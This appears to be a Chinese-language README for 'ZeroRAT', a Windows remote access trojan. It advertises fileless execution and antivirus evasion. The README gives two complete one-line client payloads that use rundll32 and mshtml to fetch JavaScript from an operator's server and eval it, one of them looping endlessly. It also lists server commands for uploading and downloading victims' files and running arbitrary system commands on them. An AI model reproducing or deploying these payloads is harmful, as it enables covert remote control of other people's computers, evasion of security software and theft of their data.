#ZeroRAT
##简介
适用于windows的远控，客户端只需要执行一条指令，利用windows原生的程序执行，不在磁盘写文件，具有天然免杀的特性。重启失效。

程序里的download和upload都是以客户端的视角。客户端从服务端下载文件叫做download，客户端上传文件到服务端叫做upload。

##配置
在config.py中修改客户端上线的地址和后台的管理密码，记得要检查下把debug关掉。

程序依赖flask和sqlite3，自行pip安装

##客户端
把`<server>:<ip>`替换成实际上线的地址

正常版

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://<server>:<ip>/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

不死版

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://<server>:<ip>/connect",false);while(1){try{h.Send();B=h.ResponseText;eval(B);}catch(e){}}
```

##服务端
后台： http://<server>:<ip>/server/

服务端支持的命令有

* sessions  列出活动的客户端
* use <id>  根据id选择客户端
* show globals/downloads/uploads  查看全局变量、客户端能下载的文件、客户端上传的文件
* delete session  删除当前客户端
* delete download/upload <id> 按照id删除文件
* upfile  上传文件到服务器，并添加到downloads列表
* download  设置好download_file和download_save_path两个变量即可让客户端下载文件并保存到download_save_path
* upload  设置upload_file变量，即可让客户端把upload_file的文件上传到服务器

除了上述的命令，其他均会被当做windows的系统命令来执行

命令详情请见/static/js/xkcd_cli.js

##开发
后台命令维护客户端 /static/js/xkcd_cli.js

后台命令维护服务端 /controllers/server.py

客户端维护 /controllers/client.py

客户端payload生成 payload.py

数据库操作相关 /models/

##联系方式
http://5alt.me

md5_salt [AT] qq.com

##参考资料
https://gist.github.com/subTee/f1603fa5c15d5f8825c0

http://drops.wooyun.org/tips/11764

https://github.com/chromakode/xkcdfools

http://www.kammerl.de/ascii/AsciiSignature.php

##TODO
* 完善命令
* heartbeat随任务量来决定sleep时间
* 通信流量加密
* 修改执行命令payload在客户端不出现黑框

